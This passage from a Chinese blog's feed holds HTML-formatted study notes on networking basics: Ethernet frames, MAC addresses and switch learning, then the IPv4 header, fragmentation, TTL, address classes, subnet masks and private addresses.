&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/2e2fbae2c8a8eeb77647c1ff82eabe90.png&#34; alt=&#34;2e2fbae2c8a8eeb77647c1ff82eabe90.png&#34;&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/9dcb4fd28f1f0f292991b2a49a6eef09.png&#34; alt=&#34;9dcb4fd28f1f0f292991b2a49a6eef09.png&#34;&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;以太网卡&lt;/strong&gt;：网络接口卡。也称为网卡，具有全球唯一性。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/2042a5217547c92c696d7cdbc4b06867.png&#34; alt=&#34;2042a5217547c92c696d7cdbc4b06867.png&#34;&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;以太网帧介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#以太网帧介绍&#34;&gt;#&lt;/a&gt; 以太网帧介绍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;以太网技术所使用的帧称为以太网帧，或简称以太帧。&lt;/li&gt;
&lt;li&gt;以太帧的格式有两个标准：Ethernet_II 格式和 IEEE 802.3 格式。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/8d922703fa64ad1de45b3e66f944d129.png&#34; alt=&#34;8d922703fa64ad1de45b3e66f944d129.png&#34;&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MAC 地址&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MAC 地址在网络中唯一标识一个网卡，具有全球唯一性。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/369c83bc990abeba6a445222c9277f80.png&#34; alt=&#34;369c83bc990abeba6a445222c9277f80.png&#34;&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个 MAC 地址有 48bit，6Byte。格式如图：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/e3461837ca71bd12f7174422cbce92e3.png&#34; alt=&#34;e3461837ca71bd12f7174422cbce92e3.png&#34;&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MAC 地址构成及分类：前 3Byte 为厂商代码，由 IEEE 分配。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/fe42557aefe68d74a0e2c38e335252bc.png&#34; alt=&#34;fe42557aefe68d74a0e2c38e335252bc.png&#34;&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;单播以太帧：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;单播帧，目的 MAC 地址为单播 MAC 地址的帧，即 &lt;code&gt;1 &amp;gt;&amp;gt; 1&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/9c0561c5792036d0862cb482f2e8fe8a.png&#34; alt=&#34;9c0561c5792036d0862cb482f2e8fe8a.png&#34;&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;广播以太帧：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;广播帧，目的 MAC 地址为广播 MAC 地址的帧，即 &lt;code&gt;1 &amp;gt;&amp;gt; N&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/db49c8d00b409ede1ce428253434d392.png&#34; alt=&#34;db49c8d00b409ede1ce428253434d392.png&#34;&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;组播以太帧：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;组播帧，目的 MAC 地址为组播 MAC 地址的帧，即 &lt;code&gt;1 &amp;gt;&amp;gt; x&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/4be532fcdaf580a1ab00a52f52dbe931.png&#34; alt=&#34;4be532fcdaf580a1ab00a52f52dbe931.png&#34;&gt;&amp;lt;!--p11--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;交换机mac地址学习&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交换机mac地址学习&#34;&gt;#&lt;/a&gt; 交换机 MAC 地址学习&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;园区网典型架构：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/f15ddb8d49c3b900857cba87a09fdb15.png&#34; alt=&#34;f15ddb8d49c3b900857cba87a09fdb15.png&#34;&gt;&amp;lt;!--p12--&amp;gt;&lt;/p&gt;
&lt;p&gt;其中最下层四个为以太网二层交换机。&lt;/p&gt;
&lt;p&gt;以太网二层交换机转发数据的端口都是以太网口，并且只能够针对数据的二层头部（以太网数据帧头）中的 MAC 地址进行寻址并转发数据。&lt;/p&gt;
&lt;p&gt;** 交换机工作原理：** 根据 MAC 地址表查询并转发。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/11eba6b956a6cfd2fd38f1ce83fab940.png&#34; alt=&#34;11eba6b956a6cfd2fd38f1ce83fab940.png&#34;&gt;&amp;lt;!--p13--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;MAC 地址表&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每台交换机中都有一个 MAC 地址表，存放了 MAC 地址与交换机端口编号之间的映射关系。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/46beca99bd68475efe25f4d01488e12b.png&#34; alt=&#34;46beca99bd68475efe25f4d01488e12b.png&#34;&gt;&amp;lt;!--p14--&amp;gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;初始情况，交换机的 MAC 地址表是空的。&lt;/li&gt;
&lt;li&gt;当连接主机 1 的端口收到数据帧后查询 MAC 地址表，若没有则标位 “未知单播帧”。&lt;/li&gt;
&lt;li&gt;若没有查到则对该未知单播帧进行泛洪操作。同时交换机学习该 MAC 地址，创建表项。&lt;/li&gt;
&lt;li&gt;交换机其他端口连接的主机收到泛洪后会丢弃，主机 2 收到后处理数据帧，后通过交换机向主机回复。&lt;/li&gt;
&lt;li&gt;如果查到表项，则进行转发操作，同时会学习该数据帧的源 MAC 地址，与接收口关联，并创建表项。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;交换机数据帧处理&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#交换机数据帧处理&#34;&gt;#&lt;/a&gt; 交换机数据帧处理&lt;/h2&gt;
&lt;p&gt;交换机对于从传输介质进入某一端口的帧的处理行为一共有三种：泛洪、转发、丢弃。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/b61e6bbc57ad8f04d8bf968f652b70cf.png&#34; alt=&#34;b61e6bbc57ad8f04d8bf968f652b70cf.png&#34;&gt;&amp;lt;!--p15--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;泛洪&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从一个端口将数据帧传递至所有端口。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/8b1cefb5312e0663d0aeb9cc26217144.png&#34; alt=&#34;8b1cefb5312e0663d0aeb9cc26217144.png&#34;&gt;&amp;lt;!--p16--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;转发&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从一个端口将数据帧传递至特定端口。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/53832dd93ed48e22298cb551903968b8.png&#34; alt=&#34;53832dd93ed48e22298cb551903968b8.png&#34;&gt;&amp;lt;!--p17--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;丢弃&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;将收到的某一数据帧丢弃。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/e49f7c454dcd7c870373a61339c381f4.png&#34; alt=&#34;e49f7c454dcd7c870373a61339c381f4.png&#34;&gt;&amp;lt;!--p18--&amp;gt;&lt;/p&gt;
&lt;h2 id&gt;&lt;a class=&#34;anchor&#34; href=&#34;#&#34;&gt;#&lt;/a&gt; &lt;/h2&gt;
&lt;h2 id=&#34;同网络短数据通信全过程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#同网络短数据通信全过程&#34;&gt;#&lt;/a&gt; 同网络短数据通信全过程&lt;/h2&gt;
&lt;p&gt;案例：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/0cbf006ee49b5cc3625f003153f97f4e.png&#34; alt=&#34;0cbf006ee49b5cc3625f003153f97f4e.png&#34;&gt;&amp;lt;!--p19--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;数据封装 &amp;amp; 解封装&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/9b5f63a3e539316c6f80a3e0980dbab9.png&#34; alt=&#34;9b5f63a3e539316c6f80a3e0980dbab9.png&#34;&gt;&amp;lt;!--p20--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;初始状态&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/66a7a5ae9c80a9789358f6c569f7e811.png&#34; alt=&#34;66a7a5ae9c80a9789358f6c569f7e811.png&#34;&gt;&amp;lt;!--p21--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;泛洪数据帧&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/ee88c756576c556580a09dff7c6bc447.png&#34; alt=&#34;ee88c756576c556580a09dff7c6bc447.png&#34;&gt;&amp;lt;!--p22--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;学习 MAC 地址&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/b0db5cfad6ea03c9b922adce71d0cfd7.png&#34; alt=&#34;b0db5cfad6ea03c9b922adce71d0cfd7.png&#34;&gt;&amp;lt;!--p23--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;目标主机回复&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/28/8765ccd9354d80fadfae9f06f54dbc20.png&#34; alt=&#34;8765ccd9354d80fadfae9f06f54dbc20.png&#34;&gt;&amp;lt;!--p24--&amp;gt;&lt;/p&gt;
</content>
        <category term="ICT" />
        <updated>2022-02-28T12:41:16.532Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2022/02/15/2022%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/</id>
        <title></title>
        <link rel="alternate" href="http://imfanqie.top/2022/02/15/2022%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/"/>
        <content type="html"></content>
        <updated>2022-02-15T04:24:48.501Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2022/02/11/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE%E5%8F%8AIP%E7%BC%96%E5%9D%80/</id>
        <title>ICT笔记-网络层协议及IP编址</title>
        <link rel="alternate" href="http://imfanqie.top/2022/02/11/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E7%BD%91%E7%BB%9C%E5%B1%82%E5%8D%8F%E8%AE%AE%E5%8F%8AIP%E7%BC%96%E5%9D%80/"/>
        <content type="html">&lt;ul&gt;
&lt;li&gt;描述网络层的主要协议&lt;/li&gt;
&lt;li&gt;描述 IPv4 地址的概念、分类及特殊 IP 地址&lt;/li&gt;
&lt;li&gt;计算 IP 网络以及 IP 子网&lt;/li&gt;
&lt;li&gt;掌握 IP 网络地址规划方式&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;网络层协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络层协议&#34;&gt;#&lt;/a&gt; 网络层协议&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;网络层经常被称为 IP 层，但其中并不只有 IP 协议，还包括 ICMP、IPX 等协议。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/289557be8e1ebc61728f7f15022272d0.png&#34; alt=&#34;289557be8e1ebc61728f7f15022272d0.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IP 协议有版本之分，分别是 IPv4 和 IPv6。目前，Internet 上的 IP 报文主要都是 IPv4 报文，但是逐步在向 IPv6 过渡。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IPv4（Internet Protocol Version 4）协议族是 TCP/IP 协议族中最为核心的协议族。它工作在 TCP/IP 协议栈的网络层，该层与 OSI 参考模型的网络层相对应。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;IPv6（Internet Protocol Version 6）是网络层协议的第二代标准协议，也被称为 IPng（IP Next Generation）。它是 Internet 工程任务组 IETF（Internet Engineering Task Force）设计的一套规范，是 IPv4（Internet Protocol Version 4）的升级版本。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;数据封装过程&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;上层数据在传输层添加 TCP 报头后得到的 PDU 被称为 Segment（数据段）&lt;/li&gt;
&lt;li&gt;数据段被传递给网络层，网络层添加 IP 报头得到的 PDU 被称为 Packet（数据包）&lt;/li&gt;
&lt;li&gt;数据包被传递到数据链路层，封装数据链路层报头和尾部得到的 PDU 被称为 Frame（数据帧）&lt;/li&gt;
&lt;li&gt;最后，帧被转换为比特，通过网络介质传输。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/f521d1c7e61a4a41c55113c2c5f50f3e.png&#34; alt=&#34;f521d1c7e61a4a41c55113c2c5f50f3e.png&#34;&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IPv4 报文格式&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/daa4d4f6fb4ded7a7eaeef0840dce472.png&#34; alt=&#34;daa4d4f6fb4ded7a7eaeef0840dce472.png&#34;&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IP Packet（IP 数据包），其包头主要内容如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;▫ Version：4 bit，4：表示为IPv4；6：表示为IPv6。
▫ Header Length：4 bit，首部长度，如果不带Option字段，则为20，最长为60。
▫ Type of Service：8 bit，服务类型。只有在有QoS差分服务要求时，这个字段才起作用。
▫ Total Length：16 bit，总长度，整个IP数据包的长度。
▫ Identification：16 bit，标识，分片重组时会用到该字段。
▫ Flags：3 bit，标志位。
▫ Fragment Offset：12 bit，片偏移，分片重组时会用到该字段。
▫ Time to Live：8 bit，生存时间。
▫ Protocol：8 bit，协议：下一层协议。指出此数据包携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给哪个进程处理。
	▪ 常见值：
	− 1: ICMP, Internet Control Message；
	− 2: IGMP, Internet Group Management；
	− 6: TCP , Transmission Control Protocol；
	− 17: UDP, User Datagram Protocol。
▫ Header Checksum：16 bit，首部检验和。
▫ Source IP Address：32 bit，源IP地址。
▫ Destination IP Address：32 bit，目的IP地址。
▫ Options：可变，选项字段。
▫ Padding：可变，填充字段，全填0。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;数据包分片&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;将报文分割成多个片段的过程叫做分片。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果报文长度超过数据链路所支持的最大长度，则需要分割成若干个较小的片段才能传输。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/804be2d889f00b8a2337e1ff10a112fb.png&#34; alt=&#34;804be2d889f00b8a2337e1ff10a112fb.png&#34;&gt;&amp;lt;!--P4--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• Identification：16 bit，发送主机赋予的标识，分片重组时会用到该字段。
• Flags：3 bit，标志位。
	▫ 保留段位：0，保留。
	▫ 不分段位：1，表示“不能分片”；0，表示“能分片”。
	▫ 更多段位：1，表示“后面还有分片”；0，表示“最后一个数据片”。
• Fragment Offset：12 bit，片偏移，分片重组时会用到该字段。指出较长的分组在分片后，该片在原分组中的相对位置，与更多段位组合，帮助接收方组合分段的报文。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;生存时间 TTL（Time To Live）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/9575059a278adfd6922e0dd166c4fadc.png&#34; alt=&#34;9575059a278adfd6922e0dd166c4fadc.png&#34;&gt;&amp;lt;!--p5 --&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作用：为避免环路导致的网络拥塞，IP 报文头中包含一个生存时间 TTL（Time To Live）字段。报文每经过一台三层设备，TTL 值减 1。初始 TTL 值由源端设备设置。当报文中的 TTL 降为 0 时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源 IP 地址向源端 发送 ICMP 错误消息。&lt;/li&gt;
&lt;li&gt;TTL 最长 8bit，即取值范围 0--255&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;协议号（Protocol）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/ec1968a8a76866a2fa234a55b2251df2.png&#34; alt=&#34;ec1968a8a76866a2fa234a55b2251df2.png&#34;&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;目的端的网络层在接收并处理报文以后，需要决定下一步对报文如何处理。IP 报文头中的协议字段标识了将会继续处理报文的协议，如图所示。&lt;/p&gt;
&lt;h2 id=&#34;ipv4地址&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ipv4地址&#34;&gt;#&lt;/a&gt; IPv4 地址&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;IP 地址在网络中用于标识一个节点（或网络设备的接口）。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IP 地址用于 IP 报文在网络中的寻址。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;em&gt;注：需要使用 IP 地址的接口，通常是路由器和计算机的接口。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IP 地址表示&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/3da4ecab3a65ebbd12beb9f2d6818b33.png&#34; alt=&#34;3da4ecab3a65ebbd12beb9f2d6818b33.png&#34;&gt;&amp;lt;!--p7--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• IP地址表示
	▫ IP地址是长度是32 bit，由4个字节组成。为了阅读和书写方便，IP地址通常采用点分十进制数来表示。
	
• 点分十进制表示法
	▫ IP地址表现形式能够帮助我们更好的使用和配置网络，但通信设备在对IP地址进行计算时使用的是二进制的操作方式，因此掌握十进制、二进制的转换运算非常有必要。
	
• IPv4地址范围
	▫ 00000000.00000000.00000000.00000000~11111111.11111111.11111111.11111111，即0.0.0.0~255.255.255.255。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;IP 地址构成&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/941ab2172700677bac66aabdbc0acd3b.png&#34; alt=&#34;941ab2172700677bac66aabdbc0acd3b.png&#34;&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;IPv4 地址由如下两部分组成：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;网络部分 (网络号)：用来标识一个网络。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IP 地址不能反映任何有关主机位置的地理信息，只能通过网络号码字段判断出 主机属于哪个网络。&lt;/p&gt;
&lt;p&gt;对于网络号相同的设备，无论实际所处的物理位置如何，它们都是处在同一个 网络中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;主机部分 (主机号)：用来区分一个网络内的不同主机。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;网络掩码 (Netmask)，又称子网掩码 (Subnet Mask)：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网络掩码为 32 bit，与 IP 地址的位数一样，通常也以点分十进制数来表示。&lt;/li&gt;
&lt;li&gt;网络掩码不是一个 IP 地址，在二进制的表示上是一堆连续的 1、后面接一堆连续的 0。&lt;/li&gt;
&lt;li&gt;通常将网络掩码中 1 的个数称为这个网络掩码的长度。如：掩码 0.0.0.0 的长度是 0，掩 码 252.0.0.0 的长度是 6。&lt;/li&gt;
&lt;li&gt;网络掩码一般与 IP 地址结合使用，其中值为 1 的比特对应 IP 地址中的网络位；值为 0 的 比特对应 IP 地址中的主机位，以此来辅助我们识别一个 IP 地址中的网络位与主机位。 即网络掩码中 1 的个数就是 IP 地址的网络号的位数，0 的个数就是 IP 地址的主机号的位 数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;IP 地址寻址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/7c3889f16d724fe14515ef8f60a3cf3e.png&#34; alt=&#34;7c3889f16d724fe14515ef8f60a3cf3e.png&#34;&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;p&gt;IP 寻址：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;网络号用于表示主机所在的网络，类似于 “XX 省 XX 市 XX 区 XX 小区” 的作用。&lt;/p&gt;
&lt;p&gt;主机号用于表示网络号所定义的网络范围内某个特定的主机接口，类似于门牌号 “XX 栋 XX 号” 的作用。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;网络寻址：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;二层网络寻址：可直接通过 IP 地址，找到对应的主机接口。&lt;/p&gt;
&lt;p&gt;三层网络寻址：利用网关转发来自不同网段之间的数据包。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;IP 地址分类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/65ca4707825e352616214061d5e115d7.png&#34; alt=&#34;65ca4707825e352616214061d5e115d7.png&#34;&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;p&gt;为了方便 IP 地址的管理及组网，IP 地址分成五类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A、B、C、D、E 类的类别字段分别是二进制数 0、10、110、1110、1111，通过网络 号码字段的前几个比特就可以判断 IP 地址属于哪一类，这是区分各类地址最简单的方 法。&lt;/li&gt;
&lt;li&gt;A、B、C 三类地址是单播 IP 地址 (除一些特殊地址外)，只有这三类地址才能分配给主 机接口使用。&lt;/li&gt;
&lt;li&gt;D 类地址属于组播 IP 地址。&lt;/li&gt;
&lt;li&gt;E 类地址专门用于特殊的实验目的。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A、B、C 类地址比较：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 A 类地址的网络称为 A 类网络；使用 B 类地址的网络称为 B 类网络；使用 C 类地址的 网络称为 C 类网络。&lt;/li&gt;
&lt;li&gt;A 类网络的网络号为 8 bit，个数很少，但所允许的主机接口的个数很多；首位恒定为 0， 地址空间为：0.0.0.0~127.255.255.255。&lt;/li&gt;
&lt;li&gt;B 类网络的网络号为 16 bit，介于 A 类和 C 类网络之间；首两位恒定为 10，地址空间为： 128.0.0.0~191.255.255.255。&lt;/li&gt;
&lt;li&gt;C 类网络的网络号为 24 bit，个数很多，但所允许的主机接口的个数就很少；首三位恒 定为 110，地址空间为：192.0.0.0~223.255.255.255。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;主机 (Host)，通常指路由器和计算机的统称。并且常把主机的某个接口的 IP 地址简称 为主机 IP 地址。&lt;/p&gt;
&lt;p&gt;组播地址：组播能实现一对多传递消息。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;IP 地址类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/f602f6dedd26839d2c5cd081495298bd.png&#34; alt=&#34;f602f6dedd26839d2c5cd081495298bd.png&#34;&gt;&amp;lt;!--p11--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;网络地址：主机号全为 0，不能分配给具体的主机接口使用&lt;/li&gt;
&lt;li&gt;广播地址：主机号全为 1，不能分配给具体的主机接口使用&lt;/li&gt;
&lt;li&gt;可用地址：又称主机地址。&lt;/li&gt;
&lt;li&gt;一个网段可用地址数量计算：若主机位为 n，则 IP 地址数为 2ⁿ，可用 IP 地址数为：2ⁿ-2 （减去网络地址 和广播地址）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;IP 地址计算&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/d85854c9d6cad3a7f71943f18c8bee2e.png&#34; alt=&#34;d85854c9d6cad3a7f71943f18c8bee2e.png&#34;&gt;&amp;lt;!--p12--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• 网络地址：将IP地址的主机位全设为0，所得结果是该IP地址所在网络的网络地址。
• 广播地址：将IP地址的主机位全设为1，所得结果是该IP地址所在网络的广播地址。
• IP地址数：2ⁿ，n为主机位位数。
• 可用IP地址数：2ⁿ-2，n为主机位位数。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;私网 IP 地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;为了解决 IP 地址短缺的问题，提出了私有地址的概念。私有地址是指内部网络或主机地址， 这些地址只能用于某个内部网络，不能用于公共网络。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;公网 IP 地址：连接到 Internet 的网络设备必须具有由 ICANN 分配的公网 IP 地址。&lt;/p&gt;
&lt;p&gt;私网 IP 地址：私网 IP 地址的使用使得网络可以得到更为自由地扩展，因为同一个私网 IP 地址是可以在不同的私有网络中重复使用的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/ffe42a642d807c800d1132610c538309.png&#34; alt=&#34;ffe42a642d807c800d1132610c538309.png&#34;&gt;&amp;lt;!--p13--&amp;gt;&lt;/p&gt;
&lt;p&gt;私有网络连接到 Internet：私有网络由于使用了私网 IP 地址，是不允许连接到 Internet 的。 后来在实际需求的驱动下，许多私有网络也希望能够连接到 Internet 上，从而实现私网与 Internet 之间的通信，以及通过 Internet 实现私网与私网之间的通信。私网与 Internet 的互联， 必须使用网络地址转换 (NAT) 技术实现。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;特殊 IP 地址&lt;/strong&gt;&lt;/p&gt;
